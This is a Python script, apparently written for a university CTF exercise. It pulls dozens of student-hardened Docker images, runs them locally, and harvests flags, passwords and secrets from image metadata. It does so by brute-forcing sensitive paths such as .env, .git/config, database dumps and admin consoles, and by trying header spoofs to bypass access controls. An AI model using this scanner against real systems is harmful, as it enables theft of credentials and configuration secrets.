#!/usr/bin/env python3
"""
Network-Only Docker Image Attack Script for CTF Flag Hunting
Author: Offensive Security Team
Purpose: Automated penetration testing for Phase 3 - IntSec 2025
Compliance: Network-based attacks only (no direct container interaction)
"""

import docker
import re
import os
import sys
import json
import time
import requests
import threading
from datetime import datetime
import platform
from urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Detect OS
IS_WINDOWS = platform.system() == 'Windows'

# Color codes for output
class Colors:
    if IS_WINDOWS:
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except:
            pass
    
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# Target images
TARGET_IMAGES = [
    "elnino/intsec-2025:hardened-v2",
    "kv1st3n/passoire_final:latest",
    "albinheldebro/passoire_final:latest",
    "arsadraei/passoire_hardened:final",
    "akra9743/hardened-passoire:latest",
    "qilu2001/passoire-hardened:phase2",
    "cait7999/passoire-hardened:latest",
    "tiagomiguel29/hardened-passoire:latest",
    "bhanukac/group_27_intsec:v6",
    "emadetemad/passoire_hardened:latest",
    "viqingo/passoire-hardened-group34:latest",
    "aw950309/passoire:v4",
    "taro0510/passoire_36:v5",
    "maple1058/42_final_image:v1",
    "galaldh/passoire:hardened",
    "tomej2/group50repository:latest",
    "hampusbosson/grupp60_intsec:v3",
    "carmencanedo/intsec:passoire-final",
    "intsecgroup3/group3-app-image:v2.0",
    "lindaelize/passoire-merged:latest",
    "wallowa/passoire-intsec:latest",
    "emrenebiler/passoire_gr7:latest",
    "tylerponte/intsec:intsec-group8",
    "mikaellw/projectgroup9:latest",
    "theorjiugovictor/passoire:group10-v9",
    "rosella25/project_passoire:group_12",
    "chabsieger/passoire-secure:v1",
    "mellowcube/passoire-group18-modified:v1.0.0",
    "smariful/passoire-secure:v2",
    "aimo2926/passoire-hardened:v1",
    "huzaifa7470/group19_passoire_hardened:latest",
    "uthpalavi/passoire20-secure:v1",
    "thlak/group_23_passoire:modified",
    "gabbipls/new-passoire-intsec25:phase2",
    "deadbacteria8/passoire-grupp:latest",
    "hcipher/hardened-image:v3",
    "codyprince/test:latest",
    "shoveltime/passoire_group30_public:latest",
    "shahidalvit/passoire-hardened-by-group32:latest",
    "ichigoku/passoire:grupp33-v5",
    "martijnme/intro-sec-group-37:v1.1.7",
    "hiramlopez/passoire-38-v2:from-github",
    "kali6753/passoire:NEW",
    "madli/passoire:hardened",
    "fabiopereira98/project_group52:final",
    "hanjoh/group55:improved3",
    "askanberg/grupp57:v3",
    "g62intsec/g62intsec-public:latest",
    "alexkord/saferpoint:latest",
    "gl767077147/passoire-group-66:latest",
    "shamelwaseem/intsec_67:1.0",
    "intsec25group68/phase_2:final",
    "georgiosekapsas/intsec_group_69:v3",
]

# Flag patterns
FLAG_PATTERNS = [
    r'FLAG\{[^\}]+\}',
    r'flag\{[^\}]+\}',
    r'CTF\{[^\}]+\}',
    r'[A-F0-9]{32}',  # MD5
    r'[A-F0-9]{40}',  # SHA1
    r'flag[_:\s=]+[A-Za-z0-9_\-]+',
    r'password[_:\s=]+[A-Za-z0-9_\-]+',
    r'secret[_:\s=]+[A-Za-z0-9_\-]+',
]

# Thread-safe results
results = []
results_lock = threading.Lock()
found_flag_values = set()

def log(message, level="INFO"):
    """Enhanced logging with colors"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    colors = {
        "INFO": Colors.OKBLUE,
        "SUCCESS": Colors.OKGREEN,
        "WARNING": Colors.WARNING,
        "ERROR": Colors.FAIL,
        "FLAG": Colors.OKCYAN + Colors.BOLD
    }
    color = colors.get(level, Colors.ENDC)
    print(f"{color}[{timestamp}] [{level}] {message}{Colors.ENDC}", flush=True)

def save_flag(flag_value, method, image_name):
    """Save discovered flag (thread-safe)"""
    with results_lock:
        if flag_value in found_flag_values:
            return
        
        found_flag_values.add(flag_value)
        flag_num = len(results) + 1
        
        result = {
            "flag_number": flag_num,
            "flag_value": flag_value,
            "discovery_method": method,
            "image": image_name,
            "timestamp": datetime.now().isoformat()
        }
        results.append(result)
        log(f"🚩 FLAG #{flag_num} FOUND: {flag_value}", "FLAG")
        log(f"   Method: {method}", "FLAG")
        log(f"   Image: {image_name}", "FLAG")

def pull_image(client, image_name):
    """Pull Docker image if not present"""
    try:
        log(f"Checking/pulling {image_name}...")
        try:
            client.images.get(image_name)
            log(f"✓ Image {image_name} already exists", "SUCCESS")
            return True
        except docker.errors.ImageNotFound:
            log(f"Pulling {image_name}...")
            
            for platform_str in ["linux/amd64", "linux/arm64", None]:
                try:
                    if platform_str:
                        client.images.pull(image_name, platform=platform_str)
                    else:
                        client.images.pull(image_name)
                    log(f"✓ Successfully pulled {image_name}", "SUCCESS")
                    return True
                except Exception as e:
                    if platform_str is None:
                        log(f"✗ Failed to pull {image_name}: {str(e)[:100]}", "ERROR")
                        return False
                    continue
            return False
    except Exception as e:
        log(f"✗ Error with {image_name}: {str(e)[:100]}", "ERROR")
        return False

def search_for_flags(text, image_name, method):
    """Search text for flag patterns"""
    if not text:
        return []
    
    found_flags = []
    text_str = str(text)
    
    for pattern in FLAG_PATTERNS:
        try:
            matches = re.finditer(pattern, text_str, re.IGNORECASE | re.MULTILINE)
            for match in matches:
                flag_value = match.group(0).strip()
                if len(flag_value) > 5 and flag_value not in found_flag_values:
                    if 'flag' in flag_value.lower() or len(flag_value) >= 32:
                        save_flag(flag_value, method, image_name)
                        found_flags.append(flag_value)
        except:
            pass
    
    return found_flags

def analyze_image_metadata(client, image_name):
    """
    COMPLIANT: Analyze image metadata and layers (static analysis)
    This does NOT interact with running container
    """
    log(f"🔍 Analyzing image metadata for {image_name}...")
    
    try:
        image = client.images.get(image_name)
        
        # Check image history
        history = image.history()
        for idx, layer in enumerate(history):
            created_by = layer.get('CreatedBy', '')
            if created_by:
                search_for_flags(created_by, image_name, f"Image Layer {idx} Command")
        
        # Check configuration
        config = image.attrs.get('Config', {})
        
        # Environment variables
        env_vars = config.get('Env', [])
        for env in env_vars:
            search_for_flags(env, image_name, "Environment Variable")
        
        # Labels
        labels = config.get('Labels', {})
        if labels:
            for key, value in labels.items():
                search_for_flags(f"{key}={value}", image_name, "Image Label")
        
        # Command and Entrypoint
        cmd = config.get('Cmd', [])
        entrypoint = config.get('Entrypoint', [])
        if cmd:
            search_for_flags(str(cmd), image_name, "CMD")
        if entrypoint:
            search_for_flags(str(entrypoint), image_name, "ENTRYPOINT")
        
        # Working directory
        workdir = config.get('WorkingDir', '')
        if workdir:
            search_for_flags(workdir, image_name, "WorkingDir")
        
        log(f"✓ Metadata analysis complete for {image_name}", "SUCCESS")
        
    except Exception as e:
        log(f"✗ Metadata analysis error: {str(e)[:100]}", "ERROR")

def network_attack_container(client, image_name):
    """
    COMPLIANT: Run container and attack ONLY via network
    """
    log(f"🚀 Starting container for network attack: {image_name}...")
    
    container = None
    try:
        # Run container with port mapping
        container = client.containers.run(
            image_name,
            detach=True,
            ports={
                '80/tcp': None, '443/tcp': None, '22/tcp': None, 
                '3306/tcp': None, '5432/tcp': None, '8080/tcp': None,
                '5000/tcp': None, '3000/tcp': None, '8000/tcp': None,
                '9000/tcp': None, '4000/tcp': None, '8888/tcp': None
            },
            remove=False,
            auto_remove=False
        )
        
        log(f"Container started, waiting for services...")
        time.sleep(15)  # Wait for services
        
        # Get container info
        container.reload()
        network_settings = container.attrs['NetworkSettings']
        ports_info = network_settings.get('Ports', {})
        
        # Get host-accessible ports
        accessible_ports = []
        for container_port, host_bindings in ports_info.items():
            if host_bindings:
                for binding in host_bindings:
                    host_port = binding.get('HostPort')
                    if host_port:
                        accessible_ports.append(int(host_port))
                        log(f"Port mapping: {container_port} -> localhost:{host_port}")
        
        # Fallback ports
        if not accessible_ports:
            accessible_ports = [80, 443, 8080, 3000, 5000, 8000]
        
        log(f"Testing {len(accessible_ports)} ports via network...")
        
        # Attack web services via network ONLY
        for port in accessible_ports:
            attack_web_service(port, image_name)
        
        log(f"✓ Network attack complete for {image_name}", "SUCCESS")
        
    except Exception as e:
        log(f"✗ Network attack error: {str(e)[:200]}", "ERROR")
    finally:
        if container:
            try:
                container.stop(timeout=5)
                container.remove()
                log(f"Container stopped and removed")
            except Exception as e:
                log(f"Error cleaning up container: {str(e)[:100]}", "WARNING")

def attack_web_service(port, image_name):
    """
    COMPLIANT: Attack web service via HTTP (network only)
    """
    
    base_urls = [
        f"http://localhost:{port}",
        f"http://127.0.0.1:{port}",
    ]
    
    # Comprehensive path list for web attacks
    paths = [
        '/', '/flag', '/flag.txt', '/flag1', '/flag2', '/flag3', '/flag4', '/flag5',
        '/secret', '/secret.txt', '/secrets', '/secrets.txt',
        '/admin', '/admin/flag', '/admin/config', '/admin/secret',
        '/config', '/config.json', '/config.php', '/config.yml', '/config.yaml',
        '/robots.txt', '/.env', '/.env.local', '/.env.production',
        '/backup', '/backup.sql', '/dump.sql', '/database.sql',
        '/.git/config', '/.git/HEAD', '/.git/index',
        '/api/flag', '/api/config', '/api/secret', '/api/keys',
        '/debug', '/status', '/health', '/info', '/version',
        '/swagger.json', '/openapi.json', '/api-docs', '/docs',
        '/users', '/user', '/login', '/register', '/auth',
        '/test', '/dev', '/development', '/staging', '/prod',
        '/.well-known/security.txt', '/security.txt',
        '/flag.php', '/flag.html', '/index.html', '/index.php',
        '/info.php', '/phpinfo.php', '/test.php',
        '/passwords.txt', '/secrets.txt', '/keys.txt', '/tokens.txt',
        '/wp-config.php', '/configuration.php', '/settings.php',
        '/app/config', '/conf/config', '/etc/config',
        '/api/v1/flag', '/v1/flag', '/v2/flag', '/api/v1/secrets',
        '/metrics', '/actuator', '/actuator/env', '/actuator/health',
        '/console', '/dashboard', '/phpmyadmin', '/adminer',
        '/_admin', '/_config', '/_debug', '/_private',
        '/private', '/internal', '/hidden', '/secret-area',
        # Common file extensions
        '/flag.xml', '/flag.json', '/flag.yml', '/flag.yaml',
        '/secret.xml', '/secret.json', '/secret.yml',
        # Common backup patterns
        '/backup.zip', '/backup.tar.gz', '/site.zip',
        '/www.zip', '/html.zip', '/public.zip',
        # Directory listings
        '/files', '/uploads', '/downloads', '/assets',
        '/static', '/public', '/media', '/data',
        # Source code leaks
        '/src', '/source', '/app.py', '/main.py', '/server.py',
        '/index.js', '/app.js', '/server.js', '/main.js',
        # Documentation
        '/readme', '/README', '/README.md', '/README.txt',
        '/CHANGELOG', '/CHANGELOG.md', '/TODO', '/TODO.txt',
        # Common subdirectories
        '/admin/flags', '/user/flags', '/private/flags',
        '/hidden/flag', '/secret/flag', '/internal/flag',
    ]
    
    # HTTP methods to try
    methods = ['GET', 'POST', 'OPTIONS', 'HEAD']
    
    # Additional headers for different attacks
    header_sets = [
        {'User-Agent': 'Mozilla/5.0'},
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Original-URL': '/admin'},
        {'X-Custom-IP-Authorization': '127.0.0.1'},
    ]
    
    successful_requests = 0
    
    for base_url in base_urls:
        for path in paths:
            for method in methods:
                for headers in header_sets:
                    try:
                        if method == 'GET':
                            response = requests.get(
                                f"{base_url}{path}",
                                timeout=3,
                                allow_redirects=True,
                                headers=headers,
                                verify=False
                            )
                        elif method == 'POST':
                            response = requests.post(
                                f"{base_url}{path}",
                                timeout=3,
                                data={'flag': '1', 'secret': '1'},
                                headers=headers,
                                verify=False
                            )
                        elif method == 'OPTIONS':
                            response = requests.options(
                                f"{base_url}{path}",
                                timeout=3,
                                headers=headers,
                                verify=False
                            )
                        else:
                            continue
                        
                        if response.status_code in [200, 201, 202, 203]:
                            successful_requests += 1
                            
                            # Search response body
                            search_for_flags(response.text, image_name, f"Web {method}: {path}")
                            
                            # Search headers
                            search_for_flags(str(response.headers), image_name, f"Web Headers: {path}")
                            
                            # Search cookies
                            if response.cookies:
                                search_for_flags(str(response.cookies), image_name, f"Web Cookies: {path}")
                            
                            # Check HTML comments
                            if '<!--' in response.text:
                                comments = re.findall(r'<!--(.*?)-->', response.text, re.DOTALL)
                                for comment in comments:
                                    search_for_flags(comment, image_name, f"HTML Comment: {path}")
                            
                            # Check JavaScript variables
                            js_vars = re.findall(r'var\s+\w+\s*=\s*["\']([^"\']+)["\']', response.text)
                            for var in js_vars:
                                search_for_flags(var, image_name, f"JS Variable: {path}")
                            
                            # Only try one header set if successful
                            break
                        
                    except requests.exceptions.RequestException:
                        pass
                    except Exception:
                        pass
                
                # Only try other methods if GET fails
                if method == 'GET' and successful_requests > 0:
                    break
    
    if successful_requests > 0:
        log(f"✓ Made {successful_requests} successful requests on port {port}")

def attack_single_image(client, image_name):
    """Attack single image with compliant techniques"""
    log(f"\n{'='*70}", "INFO")
    log(f"🎯 ATTACKING: {image_name}", "INFO")
    log(f"{'='*70}", "INFO")
    
    if not pull_image(client, image_name):
        log(f"Skipping {image_name} - could not pull", "WARNING")
        return
    
    try:
        # COMPLIANT attacks only
        analyze_image_metadata(client, image_name)
        network_attack_container(client, image_name)
        
        log(f"✓ Completed attacking {image_name}", "SUCCESS")
    except Exception as e:
        log(f"✗ Error attacking {image_name}: {str(e)[:200]}", "ERROR")

def main():
    """Main orchestration"""
    print(f"{Colors.OKGREEN}{'='*70}{Colors.ENDC}")
    print(f"{Colors.BOLD}🔥 COMPLIANT DOCKER CTF ATTACK SCRIPT 🔥{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Phase 3: Network-Only Attacks - IntSec 2025{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Platform: {platform.system()} {platform.machine()}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Total targets: {len(TARGET_IMAGES)}{Colors.ENDC}")
    print(f"{Colors.WARNING}⚠️  Network attacks only - No direct container interaction{Colors.ENDC}")
    print(f"{Colors.OKGREEN}{'='*70}{Colors.ENDC}\n")
    
    try:
        client = docker.from_env()
        log("✓ Docker client initialized", "SUCCESS")
        client.ping()
        log("✓ Docker daemon is running", "SUCCESS")
    except Exception as e:
        log(f"✗ Failed to initialize Docker: {str(e)}", "ERROR")
        log("Make sure Docker Desktop is running!", "ERROR")
        input("Press Enter to exit...")
        sys.exit(1)
    
    start_time = time.time()
    
    # Attack each image
    for idx, image_name in enumerate(TARGET_IMAGES, 1):
        log(f"\n[{idx}/{len(TARGET_IMAGES)}] Processing {image_name}...", "INFO")
        attack_single_image(client, image_name)
        
        # Save intermediate results
        if results:
            with open('flags_found.json', 'w') as f:
                json.dump(results, f, indent=2)
    
    elapsed_time = time.time() - start_time
    
    # Final output
    print(f"\n{Colors.OKGREEN}{'='*70}{Colors.ENDC}")
    print(f"{Colors.BOLD}🏆 ATTACK SUMMARY 🏆{Colors.ENDC}")
    print(f"{Colors.OKGREEN}{'='*70}{Colors.ENDC}")
    log(f"Time elapsed: {elapsed_time/60:.2f} minutes", "INFO")
    log(f"Images attacked: {len(TARGET_IMAGES)}", "INFO")
    
    if results:
        log(f"🎉 Total flags found: {len(results)} 🎉", "SUCCESS")
        
        with open('flags_found.json', 'w') as f:
            json.dump(results, f, indent=2)
        
        report_path = 'attack_report.txt'
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write("="*70 + "\n")
            f.write("INTSEC 2025 - PHASE 3 COMPLIANT ATTACK REPORT\n")
            f.write("="*70 + "\n\n")
            f.write(f"Total Flags Found: {len(results)}\n")
            f.write(f"Attack Duration: {elapsed_time/60:.2f} minutes\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            for result in results:
                f.write(f"{'='*70}\n")
                f.write(f"Flag #{result['flag_number']}\n")
                f.write(f"{'-'*70}\n")
                f.write(f"Value: {result['flag_value']}\n")
                f.write(f"Found in Image: {result['image']}\n")
                f.write(f"Discovery Method: {result['discovery_method']}\n")
                f.write(f"Timestamp: {result['timestamp']}\n")
                f.write(f"{'='*70}\n\n")
        
        print(f"\n{Colors.OKGREEN}{'='*70}{Colors.ENDC}")
        print(f"{Colors.BOLD}{'Flag #':<10} {'Value':<35} {'Image'}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}{'='*70}{Colors.ENDC}")
        
        for result in results:
            flag_num = f"#{result['flag_number']}"
            flag_val = result['flag_value'][:32] + "..." if len(result['flag_value']) > 35 else result['flag_value']
            img = result['image'].split(':')[0].split('/')[-1][:20]
            print(f"{Colors.OKCYAN}{flag_num:<10}{Colors.ENDC} {flag_val:<35} {img}")
        
        print(f"{Colors.OKGREEN}{'='*70}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}✓ Results saved to:{Colors.ENDC}")
        print(f"  {Colors.BOLD}- flags_found.json{Colors.ENDC}")
        print(f"  {Colors.BOLD}- attack_report.txt{Colors.ENDC}")
    else:
        log("⚠️  No flags found", "WARNING")
    
    print(f"\n{Colors.OKGREEN}✓ Attack completed!{Colors.ENDC}\n")
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("\n⚠️  Attack interrupted by user", "WARNING")
        if results:
            with open('flags_found.json', 'w') as f:
                json.dump(results, f, indent=2)
            log("Partial results saved", "INFO")
        input("Press Enter to exit...")
        sys.exit(0)
    except Exception as e:
        log(f"✗ Fatal error: {str(e)}", "ERROR")
        import traceback
        traceback.print_exc()
        input("Press Enter to exit...")
        sys.exit(1)